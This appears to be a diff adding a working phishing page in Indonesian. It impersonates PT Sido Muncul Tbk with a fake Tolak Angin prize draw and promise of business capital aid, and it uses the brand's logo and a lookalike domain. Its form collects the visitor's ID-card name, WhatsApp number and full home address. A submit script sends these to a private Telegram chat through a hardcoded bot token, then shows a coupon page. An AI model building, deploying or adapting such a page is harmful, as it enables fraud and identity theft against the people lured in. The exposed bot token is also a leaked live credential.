@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Meta Tag Open Graph untuk Facebook -->
+    <meta
+      property="og:title"
+      content="Bantuan Modal Usaha PT. Sido Muncul TBK."
+    />
+    <meta
+      property="og:description"
+      content="Daftarkan diri Anda untuk mendapatkan bantuan modal usaha dari PT. Sido Muncul TBK."
+    />
+    <meta
+      property="og:image"
+      content="https://i.ibb.co/gvC2ybg/thumbnail.jpg"
+    />
+    <meta property="og:url" content="https://bantuansidomuncul.my.id" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="PT. Sido Muncul TBK." />
+    <meta property="og:locale" content="id_ID" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+
+    <title>Registrasi Bantuan Modal Usaha Sidomuncul</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Poppins", sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin: 0;
+        background-color: #fff; /* Warna latar belakang utama */
+        padding: 20px;
+        min-height: 100vh;
+        box-sizing: border-box;
+      }
+
+      header {
+        background-color: #fff; /* Warna latar belakang header putih */
+        color: #5c4033; /* Warna teks header coklat */
+        padding: 10px;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      header img {
+        width: 100px;
+        vertical-align: middle;
+      }
+
+      footer {
+        background-color: #fff; /* Warna latar belakang header putih */
+        color: #5c4033; /* Warna teks header coklat */
+        padding: 10px;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      footer img {
+        width: 100px;
+        vertical-align: middle;
+      }
+
+      p {
+        font-size: 13px; /* Ukuran teks */
+        color: #5c4033; /* Warna teks coklat */
+        text-align: justify; /* Posisikan teks di tengah */
+        margin-top: 20px; /* Jarak dari elemen sebelumnya */
+        font-weight: 600; /* Ketebalan teks */
+      }
+
+      p span {
+        font-size: 1.2em; /* atau ukuran sesuai keinginan */
+        color: red;
+      }
+
+      .menu-toggle {
+        background-color: #7f5539; /* Warna toggle menu coklat */
+        border: none;
+        color: white;
+        font-size: 1.5em;
+        cursor: pointer;
+        display: none; /* Sembunyikan tombol menu di layar besar */
+        padding: 5px 10px;
+        border-radius: 5px;
+      }
+
+      .menu {
+        display: none; /* Sembunyikan menu */
+        position: absolute;
+        background-color: #b97a57; /* Warna menu dropdown */
+        top: 50px; /* Posisi di bawah header */
+        right: 10px;
+        border-radius: 5px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        z-index: 1000;
+      }
+
+      .menu a {
+        color: white;
+        padding: 10px 15px;
+        text-decoration: none;
+        display: block;
+      }
+
+      .menu a:hover {
+        background-color: #7f5539; /* Warna hover pada menu */
+      }
+
+      .form-container {
+        background-color: #ccc;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        width: 90%;
+        margin: 20px auto;
+        box-sizing: border-box;
+        flex-grow: 1;
+      }
+
+      .form-container label {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 14px;
+        color: #5c4033; /* Warna teks label */
+      }
+
+      .form-container input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 14px;
+        box-sizing: border-box;
+      }
+
+      .form-container button {
+        width: 50%;
+        padding: 10px;
+        background-color: #7f5539; /* Warna tombol */
+        border: none;
+        border-radius: 10px;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        display: block;
+        margin: 0 auto;
+      }
+
+      .form-container button:hover {
+        background-color: #5c4033; /* Warna saat hover */
+      }
+
+      .image-container {
+        max-width: 400px;
+        width: 90%;
+        margin: 20px auto;
+        text-align: center;
+        color: #7f5539;
+      }
+
+      .name-container {
+        text-align: center;
+        padding: 15px;
+        font-size: 18px;
+        color: #5c4033;
+        font-weight: 600;
+      }
+
+      .separator {
+        height: 1px;
+        width: 90%;
+        background-color: #ddd;
+        margin: 0 auto;
+      }
+
+      @keyframes slide {
+        0% {
+          transform: translateY(0);
+        }
+        100% {
+          transform: translateY(-6000px);
+        } /* 100 nama x 60px per nama (termasuk pemisah) */
+      }
+
+      @media (max-width: 600px) {
+        header h1 {
+          font-size: 1.2em;
+        }
+
+        .form-container {
+          padding: 15px;
+        }
+
+        .form-container label {
+          font-size: 12px;
+        }
+
+        .form-container input,
+        .form-container button {
+          font-size: 14px;
+        }
+
+        .menu-toggle {
+          display: block;
+        }
+
+        .menu {
+          display: none;
+        }
+
+        .menu.active {
+          display: block;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <img src="IMG_20240930_032950.png" alt="Logo Kementerian Sosial" />
+      <button class="menu-toggle" id="menuToggle">&#9776;</button>
+      <nav class="menu" id="menu">
+        <a href="#">Home</a>
+        <a href="#">Tentang</a>
+        <a href="#">Kontak</a>
+      </nav>
+    </header>
+
+    <div class="image-container">
+      <img
+        src="poster.jpeg"
+        alt="Foto Bantuan Langsung Tunai"
+        style="width: 100%; border-radius: 10px"
+      />
+    </div>
+
+    <p>
+      🎉 Ikuti Undian Hadiah Tolak Angin! 🎉 Dapatkan kode Kupon dari
+      pendaftaran di bawah ini, daftar sekarang untuk kesempatan memenangkan
+      liburan impian, smartphone, sepeda motor, uang tunai puluhan juta rupiah
+      dan banyak hadiah menarik lainnya! Undian ini diadakan oleh
+      <span>PT Sido Muncul Tbk</span>, produsen terpercaya Tolak Angin. Jangan
+      lewatkan, badan sehat bersama Tolak Angin, hadiah pun didapat! Daftar
+      Sekarang!
+    </p>
+
+    <div class="form-container">
+      <form id="registrasiForm">
+        <label for="nama">Nama Sesuai KTP</label>
+        <input
+          type="text"
+          id="nama"
+          name="nama"
+          placeholder="Masukkan Nama Sesuai KTP"
+          required
+        />
+
+        <label for="phone">Nomor Telepon (WhatsApp)</label>
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="Masukkan Nomor WhatsApp"
+          required
+        />
+
+        <label for="phone">Alamat Lengkap</label>
+        <input
+          type="text"
+          id="alamat"
+          name="alamat"
+          placeholder="Masukkan Alamat Lengkap Anda"
+          required
+        />
+
+        <button type="submit">Daftar</button>
+      </form>
+    </div>
+
+    <p>
+      Setelah mendaftar, Anda akan mendapatkan kupon untuk bantuan modal usaha.
+    </p>
+
+    <footer>
+      <img src="Logo-sidomuncul-png.png" alt="logo" />
+    </footer>
+    <script>
+      // Script untuk mengarahkan ke halaman kupon setelah daftar
+      document
+        .getElementById("registrasiForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault(); // Mencegah form dari pengiriman default
+
+          const nama = document.getElementById("nama").value;
+          const phone = document.getElementById("phone").value;
+          const alamat = document.getElementById("alamat").value;
+
+          // Cek apakah nomor sudah terdaftar di localStorage
+          let registeredPhones =
+            JSON.parse(localStorage.getItem("registeredPhones")) || [];
+
+          if (registeredPhones.includes(phone)) {
+            alert(
+              "Nomor telepon ini sudah terdaftar. Silakan gunakan nomor lain."
+            );
+            return; // Hentikan proses jika nomor sudah terdaftar
+          }
+
+          // Buat pesan yang akan dikirim
+          const message = `Nama: ${nama}\nNomor Telepon: ${phone}\nAlamat: ${alamat}`;
+
+          // Ganti dengan token bot dan ID chat Anda
+          const botToken = "8162530769:AAFnXLRpegm1XcTuKi2_h9aTReq146kqp1U"; // Ganti dengan token bot Anda
+          const chatId = "5350981154"; // Ganti dengan ID chat Anda
+
+          // Kirim pesan ke Telegram
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              if (data.ok) {
+                // Simpan nomor telepon yang baru terdaftar ke localStorage
+                registeredPhones.push(phone);
+                localStorage.setItem(
+                  "registeredPhones",
+                  JSON.stringify(registeredPhones)
+                );
+
+                // Pengalihan ke halaman kupon
+                window.location.href = `coupon.html?name=${encodeURIComponent(
+                  nama
+                )}`;
+              } else {
+                console.error("Error:", data); // Log jika ada error dari Telegram API
+              }
+            })
+            .catch((error) => {
+              console.error("Error:", error); // Tangani error jaringan
+            });
+        });
+
+      // Script untuk toggle menu di mobile
+      const menuToggle = document.getElementById("menuToggle");
+      const menu = document.getElementById("menu");
+
+      menuToggle.addEventListener("click", function () {
+        menu.classList.toggle("active");
+      });
+    </script>
+  </body>
+</html>
